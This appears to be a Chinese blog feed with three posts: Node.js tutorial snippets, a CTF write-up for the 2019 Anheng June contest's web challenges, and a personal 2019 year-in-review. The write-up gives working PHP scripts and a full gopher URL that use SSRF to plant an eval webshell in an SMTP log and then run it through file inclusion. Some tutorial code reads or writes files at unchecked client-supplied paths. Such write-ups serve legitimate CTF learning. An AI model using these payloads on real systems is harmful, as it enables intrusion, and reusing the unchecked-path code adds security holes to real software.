<h4 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET/POST"></a>GET/POST</h4><h5 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line"><span class="comment">// 解析 url 参数</span></span><br><span class="line"><span class="keyword">var</span> params = url.parse(req.url, <span class="literal">true</span>).query;</span><br><span class="line">res.write(<span class="string">"网站名："</span> + params.name);</span><br><span class="line">res.write(<span class="string">"\n"</span>);</span><br><span class="line">res.write(<span class="string">"网站 URL："</span> + params.url);</span><br><span class="line">res.end();</span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<h5 id="POST型基本格式"><a href="#POST型基本格式" class="headerlink" title="POST型基本格式"></a>POST型基本格式</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="comment">// 定义了一个post变量，用于暂存请求体的信息</span></span><br><span class="line"><span class="keyword">var</span> post = <span class="string">''</span>;     </span><br><span class="line"><span class="comment">// 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中</span></span><br><span class="line">req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;    </span><br><span class="line">post += chunk;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。</span></span><br><span class="line">req.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">post = querystring.parse(post);</span><br><span class="line">res.end(util.inspect(post));</span><br><span class="line">&#125;);</span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>



<p>POST型+表单</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"><span class="keyword">var</span> postHTML = </span><br><span class="line"><span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;body&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;form method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'网站名： &lt;input name="name"&gt;&lt;br&gt;'</span> +</span><br><span class="line"><span class="string">'网站 URL： &lt;input name="url"&gt;&lt;br&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="submit"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/body&gt;&lt;/html&gt;'</span>;</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> body = <span class="string">""</span>;</span><br><span class="line">req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">body += chunk;</span><br><span class="line">&#125;);</span><br><span class="line">req.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 解析参数</span></span><br><span class="line">body = querystring.parse(body);</span><br><span class="line"><span class="comment">// 设置响应头部信息及编码</span></span><br><span class="line">res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf8'</span>&#125;);</span><br><span class="line"><span class="keyword">if</span>(body.name &amp;&amp; body.url) &#123; <span class="comment">// 输出提交的数据</span></span><br><span class="line">res.write(<span class="string">"网站名："</span> + body.name);</span><br><span class="line">res.write(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">res.write(<span class="string">"网站 URL："</span> + body.url);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  <span class="comment">// 输出表单</span></span><br><span class="line">res.write(postHTML);</span><br><span class="line">&#125;</span><br><span class="line">res.end();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<p>大概代码逻辑为监听data和end，储存request时data的数据，并且在监听end的同时将数据respone。</p>
<h5 id="模拟请求百度"><a href="#模拟请求百度" class="headerlink" title="模拟请求百度"></a>模拟请求百度</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> req = http.get(<span class="string">"http://www.baidu.com"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"STATUS: "</span> + res.statusCode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bodyChunks = [];</span><br><span class="line">res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">    bodyChunks.push(chunk);</span><br><span class="line">&#125;)</span><br><span class="line">    .on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> body = Buffer.concat(bodyChunks);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Response BODY: "</span> + body);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'The request end...'</span>)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">req.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"ERROR: "</span> + e.message);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h4 id="简单node实现Web服务"><a href="#简单node实现Web服务" class="headerlink" title="简单node实现Web服务"></a>简单node实现Web服务</h4><h5 id="Web服务端"><a href="#Web服务端" class="headerlink" title="Web服务端"></a>Web服务端</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="comment">// 创建服务器</span></span><br><span class="line">http.createServer( <span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;  </span><br><span class="line"><span class="comment">// 解析请求，包括文件名</span></span><br><span class="line"><span class="keyword">var</span> pathname = url.parse(request.url).pathname;</span><br><span class="line"><span class="comment">// 输出请求的文件名</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Request for "</span> + pathname + <span class="string">" received."</span>);</span><br><span class="line"><span class="comment">// 从文件系统中读取请求的文件内容</span></span><br><span class="line">fs.readFile(pathname.substr(<span class="number">1</span>), <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(err);</span><br><span class="line"><span class="comment">// HTTP 状态码: 404 : NOT FOUND</span></span><br><span class="line"><span class="comment">// Content Type: text/html</span></span><br><span class="line">response.writeHead(<span class="number">404</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;             </span><br><span class="line"><span class="comment">// HTTP 状态码: 200 : OK</span></span><br><span class="line"><span class="comment">// Content Type: text/html</span></span><br><span class="line">response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);    </span><br><span class="line"><span class="comment">// 响应文件内容</span></span><br><span class="line">response.write(data.toString());        </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  发送响应数据</span></span><br><span class="line">response.end();</span><br><span class="line">&#125;);   </span><br><span class="line">&#125;).listen(<span class="number">8080</span>);</span><br><span class="line"><span class="comment">// 控制台会输出以下信息</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:8080/'</span>);</span><br></pre></td></tr></table></figure>

<p>通过异步读取请求的文件名得到请求的资源作为response返回。</p>
<h5 id="Web客户端"><a href="#Web客户端" class="headerlink" title="Web客户端"></a>Web客户端</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="comment">// 用于请求的选项</span></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">host: <span class="string">'localhost'</span>,</span><br><span class="line">port: <span class="string">'8080'</span>,</span><br><span class="line">path: <span class="string">'/index.html'</span>  </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 处理响应的回调函数</span></span><br><span class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line"><span class="comment">// 不断更新数据</span></span><br><span class="line"><span class="keyword">var</span> body = <span class="string">''</span>;</span><br><span class="line">response.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">body += data;</span><br><span class="line">&#125;);</span><br><span class="line">response.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 数据接收完成</span></span><br><span class="line"><span class="built_in">console</span>.log(body);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 向服务端发送请求</span></span><br><span class="line"><span class="keyword">var</span> req = http.request(options, callback);</span><br><span class="line">req.end();</span><br></pre></td></tr></table></figure>

<h4 id="Express框架"><a href="#Express框架" class="headerlink" title="Express框架"></a>Express框架</h4><h5 id="正则匹配请求"><a href="#正则匹配请求" class="headerlink" title="正则匹配请求"></a>正则匹配请求</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/ab*cd'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;   </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"/ab*cd GET 请求"</span>);</span><br><span class="line">res.send(<span class="string">'正则匹配'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h5 id="静态文件设置"><a href="#静态文件设置" class="headerlink" title="静态文件设置"></a>静态文件设置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.use(&#39;&#x2F;public&#39;, express.static(&#39;public&#39;));</span><br></pre></td></tr></table></figure>

<h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.files[<span class="number">0</span>]);  <span class="comment">// 上传的文件信息</span></span><br><span class="line"><span class="keyword">var</span> des_file = __dirname + <span class="string">"/"</span> + req.files[<span class="number">0</span>].originalname;</span><br><span class="line">fs.readFile( req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">fs.writeFile(des_file, data, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>( err )&#123;</span><br><span class="line"><span class="built_in">console</span>.log( err );</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">response = &#123;</span><br><span class="line">message:<span class="string">'File uploaded successfully'</span>, </span><br><span class="line">filename:req.files[<span class="number">0</span>].originalname</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( response );</span><br><span class="line">res.end( <span class="built_in">JSON</span>.stringify( response ) );</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="Cookie使用"><a href="#Cookie使用" class="headerlink" title="Cookie使用"></a>Cookie使用</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express      = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>)</span><br><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line">app.use(cookieParser())</span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Cookies: "</span> + util.inspect(req.cookies));</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">8081</span>)</span><br></pre></td></tr></table></figure>

<h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mysql      = <span class="built_in">require</span>(<span class="string">'mysql'</span>);</span><br><span class="line"><span class="keyword">var</span> connection = mysql.createConnection(&#123;</span><br><span class="line">    host     : <span class="string">'localhost'</span>,</span><br><span class="line">    user     : <span class="string">'root'</span>,</span><br><span class="line">    password : <span class="string">'root'</span>,</span><br><span class="line">    database : <span class="string">'tp_test'</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">connection.connect();</span><br><span class="line"></span><br><span class="line">connection.query(<span class="string">'select * from tp_user where id=1'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">error, results, fields</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">throw</span> error;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'The solution is: '</span>, results);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>通过引入mysql来进行数据操作。</p>
<h3 id="Nginx错误配置导致目录穿越"><a href="#Nginx错误配置导致目录穿越" class="headerlink" title="Nginx错误配置导致目录穿越"></a>Nginx错误配置导致目录穿越</h3>]]></content>
  </entry>
  <entry>
    <title>安恒六月赛web部分</title>
    <url>/2019/07/03/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9Bweb%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h3 id="Web1-localview"><a href="#Web1-localview" class="headerlink" title="Web1 localview"></a>Web1 localview</h3><p>进入后扫一下目录,发现<code>admin.php</code>，不过没有权限访问，要以<code>local</code>的形式进入才能得到<code>flag</code></p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYdEK1.png" alt="ZYdEK1.png"></p>
<p>利用<code>host+client-ip+X-Forwarded-For</code>伪造ip（这里<code>127.0.0.1</code>和<code>localhost</code>..不太一样..挺伤的..)，最终<code>payload</code>如下:</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYdMPe.png" alt="ZYdMPe.png"></p>
<h3 id="Web2-easypentest"><a href="#Web2-easypentest" class="headerlink" title="Web2 easypentest"></a>Web2 easypentest</h3><p>首先特别感谢<code>南溟师傅</code>所提供的环境以及帮助(大力感谢)还有出题人的<code>docker</code>,这道题踩了很多坑..题目中的<code>smtp</code>服务也被我打挂了4次..(感谢机器人小姐姐)</p>
<p>进入题目后发现一段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line">$pos = strpos($x,<span class="string">"php"</span>);</span><br><span class="line"><span class="keyword">if</span>($pos)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"denied"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,<span class="string">"$x"</span>);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">$result = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>

<p>大概意思是过滤掉了<code>php</code>关键字，但是可以二次编码绕过，而且可以看出是存在<code>SSRF</code>漏洞的。</p>
<p>通过<code>ssrf</code>读取一下<code>flag.php</code>试一下</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYwio8.png" alt="ZYwio8.png"></p>
<p>题目提示这个<code>flag.php</code>是没有<code>flag</code>的,并且顺道给了提示在<code>/etc/hosts</code>有点东西</p>
<p>同样的<code>file</code>协议访问一下得到了一个内网<code>ip</code>:172.18.0.3,用burp对这个网段进行一下<code>fuzz</code>，并没有发现<code>mysql,Redis或者Fastcgi</code>等常见内网应用，倒是发现了25端口的<code>smtp</code>邮件服务以及<code>172.18.0.2</code>的一个<code>文件包含</code>,不过当时比赛的时候时间剩的比较少了，直接周周练查了相关资料才大概做出来。这道题所利用的知识点是<code>SMTP日志投毒+LFI</code></p>
<p><strong>原理为</strong>：当我们尝试利用<code>SMTP</code>服务处理邮件时,<code>mail.log</code>会自动添加每个邮件的相关日志,其实这一点和<code>php mail</code>函数的漏洞是很相似的，在mail函数中我们可以通过<code>-oQ /tmp -X /var/www/html/webshell.php</code>将日志文件写在<code>html</code>目录下的<code>webshell.php</code>中,而这个日志文件是自动被包含到<code>mail.log</code>，如果可以配合文件包含自然可以<code>getshell.</code></p>
<p>首先通过<code>gopher</code>协议攻击内网<code>SMTP</code>将恶意代码写入<code>/var/log/mail.log</code>，gopher转化脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$commands = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'south'</span>,</span><br><span class="line">    <span class="string">'MAIL FROM:&lt;i@southseast&gt;'</span>,</span><br><span class="line">    <span class="string">'RCPT TO:&lt;script language="php"&gt;phpinfo();@eval($_GET[_]);&lt;/script&gt;'</span>,</span><br><span class="line">    <span class="string">'DATA'</span>,</span><br><span class="line">   <span class="string">' south'</span>,</span><br><span class="line">    <span class="string">'.'</span></span><br><span class="line">);</span><br><span class="line">$payload = implode(<span class="string">'%0A'</span>, $commands);</span><br><span class="line">$url=<span class="string">"gopher://172.18.0.2:25/_"</span>.urlencode($payload);</span><br><span class="line">$true_url=str_replace(<span class="string">"php"</span>,<span class="string">"%25%37%30hp"</span>,$url);</span><br><span class="line">$true_url=str_replace(<span class="string">"\t"</span>,<span class="string">""</span>,$true_url);</span><br><span class="line"><span class="keyword">echo</span> $true_url;</span><br><span class="line"><span class="comment">#echo "http://120.77.215.95/index.php?x=gopher://172.18.0.2:25/_" . $true_url;</span></span><br><span class="line">header(<span class="string">'location: http://120.77.215.95/index.php?x=gopher://172.18.0.2:25/_'</span> . $true_url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个脚本是南溟师傅的脚本，<strong><code>%0A</code>的目的是将SMTP命令连接到以%0A分隔的一行中，并强制服务器在实际发送有效SMTP请求时向SMTP服务器发送gopher.</strong></p>
<p>我之前一直是用<code>gopherus</code>生成的，不过<code>gopherus</code>所生成的<code>payload</code>很容易把smtp打挂，不过有时候也可以正常生成，下面是利用<code>gopherus</code>打成功的截图</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYBPPS.jpg" alt="ZYBPPS.jpg"></p>
<p>命令为<code>ls /</code>，不过一到关键<code>cat flag</code>步骤就是挂…很是迷..后来就在<code>docker</code>中实验了</p>
<p>这里还要说明一下为什么..用的是<code>&lt;script language=&quot;php&quot;&gt;phpinfo();@eval($_GET[_]);&lt;/script&gt;</code></p>
<p>这种形式..而不是<code>&lt;?php xxx?&gt;</code>这种形式.因为在实际的gopher打过去的时候回把我的?转化为\t,所以就用<code>script</code>形式了，恰巧<code>php</code>版本支持，生成的<code>gopher</code>为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;172.18.0.2:25&#x2F;_south%250AMAIL+FROM%3A%3Ci%40southseast%3E%250ARCPT+TO%3A%3Cscript+language%3D%22%25%37%30hp%22%3E%25%37%30hpinfo%28%29%3B%40eval%28%24_GET%5B_%5D%29%3B%3C%2Fscript%3E%250ADATA%250A+south%250A.</span><br></pre></td></tr></table></figure>

<p>将gopher协议打过去后，利用文件包含包含日志文件<code>/var/log/mail.log</code></p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYciGV.png" alt="ZYciGV.png"></p>
<p>最后拿到<code>flag</code>（需要注意二次编码..如：<code>%26_=ls%2520/</code>==<code>&amp;_=ls /</code></p>
<p>最后看了下挂了的问题，利用<code>php://filter</code>协议读取<code>log</code>并且将<code>docker</code>中的<code>log</code>和题目中挂了的log保存到自己服务器进行文件包含，发现docker中的可以正常解析，而题目中的包含后直接返回500..这也就是为什么我的马写进去了而无法正确解析的原因把..<code>gopherus</code>的截图如下</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYBXJU.png" alt="ZYBXJU.png"></p>
<p>或许参数不太相同也是挂的原因之一.</p>
<p>还要说一下包含apache日志思路行不通的问题，可能很多人的思路都是用错误日志或者日志<code>getshell</code>，不过因为题目对log文件的限制，是不能包含到日志文件的.所以思路只能走<code>smtp日志投毒+LFI</code>了。补充一下出题人的docker镜像  <a href="qq://txfile/#">registry.cn-hangzhou.aliyuncs.com/bypass/postfix</a>(从这道题还是学到了很多的hh</p>
<h4 id="t解决方案"><a href="#t解决方案" class="headerlink" title="\t解决方案"></a>\t解决方案</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$commands = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'south'</span>,</span><br><span class="line">    <span class="string">'MAIL FROM: &lt;i@southseast&gt;'</span>,</span><br><span class="line">    <span class="string">'RCPT TO: %3C%3Fphp%20eval(%24_POST%5B%22south%22%5D)%3F%3E'</span>,</span><br><span class="line">    <span class="string">'DATA'</span>,</span><br><span class="line">    <span class="string">'south'</span>,</span><br><span class="line">    <span class="string">'.'</span></span><br><span class="line">);</span><br><span class="line">$payload = implode(<span class="string">'%0A'</span>, $commands);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'http://120.77.215.95/index.php?x=gopher://172.18.0.2:25/_'</span> . urlencode($payload);</span><br><span class="line"><span class="comment">//header('location:http://120.77.215.95/index.php?x=gopher://172.18.0.2:25/_' . urlencode($payload));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要先将<code>?</code>进行编码操作。</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZY6L28.png" alt="ZY6L28.png"></p>
<p>经过一番尝试..?不编码就是会被作为<code>\t</code>的</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>对于2019年的思考与总结</title>
    <url>/2020/01/12/%E5%AF%B9%E4%BA%8E2019%E5%B9%B4%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>转眼间2019已经过去了，伴随着人们对新的一年的美好期望，2020开始了，这里也想对自己的2019进行一个全面一些的复盘，按以下几个方面</p>
<ul>
<li>我今年做了什么</li>
<li>我明年希望做什么</li>
<li>有哪些东西我本可以在今年做的更好</li>
<li>今年踩过的坑有什么教训</li>
<li>明年想要学习和精进的东西</li>
</ul>
<p>以第三人称的视角来看一下自己今年的经历，也能更理性的分析一下需要改进的地方了。</p>
<h3 id="我今年做了什么"><a href="#我今年做了什么" class="headerlink" title="我今年做了什么"></a>我今年做了什么</h3><h4 id="比赛-学习方面"><a href="#比赛-学习方面" class="headerlink" title="比赛/学习方面"></a>比赛/学习方面</h4><p>今年打了蛮多比赛的，学到了很多知识，很多高质量比赛让我受益匪浅，也认识了很多志趣相投的伙伴师傅们，在此也特别感谢师傅们对我的帮助，在不断学习的过程中更加明确了自己的方向与学习体系，希望有一天可以成长到我心中期望的高度。</p>
<p>同时今年也通过比赛去了很多地方，比如：成都，苏州，上海，广州，体会了各个城市的一些人文特色与风味小吃(成都真的很棒)，下面的图片就是成都的锦里：</p>
<p><a href="https://imgchr.com/i/lRFFB9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/08/lRFFB9.md.jpg" alt="lRFFB9.md.jpg"></a></p>
<p><a href="https://imgchr.com/i/lRFT4x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/08/lRFT4x.md.png" alt="lRFT4x.md.png"></a></p>
<p>这是今年巅峰极客决赛后去锦里拍的，算是满足我的一个心愿吧（去歌名中的地方听着这首歌）</p>
<h4 id="书籍阅读方面："><a href="#书籍阅读方面：" class="headerlink" title="书籍阅读方面："></a>书籍阅读方面：</h4><p>在2019年里对于非技术类书籍主要看的还是以小说为主，最多的是东野圭吾的作品，也看了几部余华的作品，偶尔也会看一些投资理财类的书籍，不过投资理财类书籍的时间投入相比于小说类的时间还是少了蛮多时间，对于经济类的这方面知识更多的是在B站up主巫师财经中了解到的，而非纸质类的阅读。这一年大概阅读完的书籍：</p>
<ul>
<li>《恶意》</li>
<li>《无人生还》</li>
<li>《嫌疑人X的献身》</li>
<li>《白夜行》</li>
<li>《人生》</li>
<li>《虚无的十字架》</li>
<li>《投资中最简单的事情》</li>
</ul>
<h4 id="健康方面："><a href="#健康方面：" class="headerlink" title="健康方面："></a>健康方面：</h4><p>坚持了一段时间的夜跑，感觉身体素质好了一些，其他的健身方面就很少了，这也是我今年身体素质不太好的原因之一。</p>
<h4 id="生活方面："><a href="#生活方面：" class="headerlink" title="生活方面："></a>生活方面：</h4><p>生活方面应该是今年踩坑最多的地方了，我觉得这个放在下面单独来谈一下会更好一些。</p>
<h3 id="我明年希望做什么"><a href="#我明年希望做什么" class="headerlink" title="我明年希望做什么"></a>我明年希望做什么</h3><h4 id="比赛-学习方面-1"><a href="#比赛-学习方面-1" class="headerlink" title="比赛/学习方面"></a>比赛/学习方面</h4><p>这方面也是2020年最主要的方面，还是需要去不断的去加厚技术栈，进行思考并且实践，在新的一年里多接触一下实战，多挖一下SRC，希望可以发一些高质量的文章，冲击一下更高质量的比赛！还有就是英语方面多练习一下口语和听力，时间应该是用来做有意义的事情，浪费在毫无意义的地方上真的蛮惭愧的，这句话对2019的我来说很合适。</p>
<h4 id="生活方面：-1"><a href="#生活方面：-1" class="headerlink" title="生活方面："></a><strong>生活方面：</strong></h4><p>在生活方面像改进的地方还是蛮多的，具体方面如下</p>
<p>​    <strong>专注度：</strong>最重要的还是想提高自己的专注度，感觉之前学习的专注度并不是很高，可能坐在自习室两个小时，真正有效的学习时间只有半个小时，而那一个半小时可能都在玩，比如刷刷B站，刷刷知乎，这样低的时间利用率造成达到更多的是时间浪费后的悔恨感。</p>
<p>​    <strong>态度：</strong>在对待生活感觉需要更多的是理性思维，而过去的自己在思考面对一些问题的时候更多是感性思维占据上风，现在的想法就是逐步把感性思维转换为理性思维。</p>
<h4 id="摄影方面："><a href="#摄影方面：" class="headerlink" title="摄影方面："></a>摄影方面：</h4><p>大概是从2019的年末开始对摄影开始感兴趣，不过想先入坑一下运动相机，比如Insta360 one R或者Go pro之类的，在精力和时间允许的情况下，可以把自己平时拍到的有趣的东西以及自己的生活分享到bilibili上，做个有趣的up主！去更多的城市旅游，拍下更多有趣的风景！</p>
<h4 id="健康方面：-1"><a href="#健康方面：-1" class="headerlink" title="健康方面："></a>健康方面：</h4><p>2019糟糕的身体情况还是给我了很大的警戒的，在2020要继续坚持下跑步，开始进行长跑的训练，希望今年可以有机会参加一下马拉松（半马)，并且开始更全面与科学的健身计划。</p>
<h4 id="书籍阅读方面：-1"><a href="#书籍阅读方面：-1" class="headerlink" title="书籍阅读方面："></a>书籍阅读方面：</h4><p>技术类的书籍还是更喜欢看一些电子版或者是文章，纸质化的非技术类书籍在2019年的阅读以小说为主，理财经济类为辅，在2020年希望可以再多阅读几本东野圭吾的书吧，同时增加经济理财类书籍的阅读量。</p>
<p>2020年我的部分阅读目标：</p>
<ul>
<li>《思考的快与慢》</li>
<li>《曾国藩的正面与侧面》</li>
<li>《放学后》</li>
<li>《新参者》</li>
<li>《岛上书店》</li>
<li>《我可以咬一口吗》</li>
</ul>
